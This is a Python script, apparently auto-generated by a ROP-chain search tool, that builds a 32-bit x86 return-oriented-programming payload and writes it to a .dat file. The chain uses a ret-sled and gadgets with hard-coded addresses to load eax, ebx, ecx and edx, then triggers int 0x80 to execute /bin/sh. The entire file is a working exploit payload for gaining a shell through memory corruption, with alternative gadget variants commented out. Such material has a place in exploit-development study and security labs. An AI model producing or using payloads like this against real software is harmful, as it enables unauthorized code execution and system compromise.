# This script was generated automatically by the ROPSearch tool.
import os, pathlib

# Configuration options:
# Max length of each instruction sequence: 5
# Allow NULL bytes in payload: No
# Allow whitespace bytes in payload: No
# Ignore duplicate instruction sequence results: Yes
# Approximate byte count of stack content before saved return: 100
# Maximum number of instruction sequence variants to output for each step: 4
# Number of acceptable padding bytes for a single instruction sequence: 100

# Init the payload
payload = b''

# ROP-chain for calling: execve("/bin/sh", {NULL}, {NULL});
# Passing the executable path as the first argument is more of a convention rathar than a rule.
# Some binaries, including shells, don't check this, so having 0 arguments should be enough.
if True:
    # RET-sled
    payload += b'\x5C\x34\x3D\xEB' * 35 # 0xeb3d345c: "ret"
    
    # Set register to system call number of execve().
    # eax = 0x0000000b
    if True:
        payload += b'\x7E\xCE\x43\xEB' # 0xeb43ce7e: mov eax, 0xb; jmp 0xeb43cea4 --> pop ebx; pop esi; ret
        payload += b'\xFF' * 8
        
    # Set register to the address of "/bin/sh" in virtual memory.
    # ebx = 0xeb56cde8
    if True:
        payload += b'\x58\x45\x3D\xEB' # 0xeb3d4558: pop ebx; ret
        payload += b'\xE8\xCD\x56\xEB' # Value: 0xeb56cde8
        
        # payload += b'\x6D\x1B\x40\xEB' # 0xeb401b6d: pop ebx; ret 4
        # payload += b'\xE8\xCD\x56\xEB' # Value: 0xeb56cde8
        # payload += b'\x5C\x34\x3D\xEB' # 0xeb3d345c: ret
        # payload += b'\xFF' * 4
        
        # payload += b'\x1A\xC1\x3E\xEB' # 0xeb3ec11a: pop ebx; pop edi; ret
        # payload += b'\xE8\xCD\x56\xEB' # Value: 0xeb56cde8
        # payload += b'\xFF' * 4
        
        # payload += b'\xD4\x4B\x3D\xEB' # 0xeb3d4bd4: pop ebx; pop esi; ret
        # payload += b'\xE8\xCD\x56\xEB' # Value: 0xeb56cde8
        # payload += b'\xFF' * 4
        
    # Set register to the address of an arbitrary NULL pointer in memory.
    # ecx = 0xeb3b0178
    if True:
        payload += b'\x9B\xB9\x3E\xEB' # 0xeb3eb99b: pop ecx; pop edx; ret
        payload += b'\x78\x01\x3B\xEB' # Value: 0xeb3b0178
        payload += b'\xFF' * 4
        
        # payload += b'\x62\xD1\x44\xEB' # 0xeb44d162: pop ecx; or dh, dh; ret
        # payload += b'\x78\x01\x3B\xEB' # Value: 0xeb3b0178
        
    # Set register to the address of an arbitrary NULL pointer in memory.
    # edx = 0xeb3b0178
    if True:
        payload += b'\x9C\xB9\x3E\xEB' # 0xeb3eb99c: pop edx; ret
        payload += b'\x78\x01\x3B\xEB' # Value: 0xeb3b0178
        
    # Make the system call
    if True:
        payload += b'\x86\x17\x4B\xEB' # 0xeb4b1786: int 0x80; push ecx; cmp eax, 0xfffff001; jae 0xeb3d4e20; ret
    
# Change the CWD of the script to its own directory.
abspath = os.path.abspath(__file__)
dname = os.path.dirname(abspath)
os.chdir(dname)

# Write the payload bytes to a file.
scriptFileNameWithoutExtension = pathlib.Path(__file__).stem
with open(f'{scriptFileNameWithoutExtension}.dat', 'wb') as fout:
    fout.write(payload)

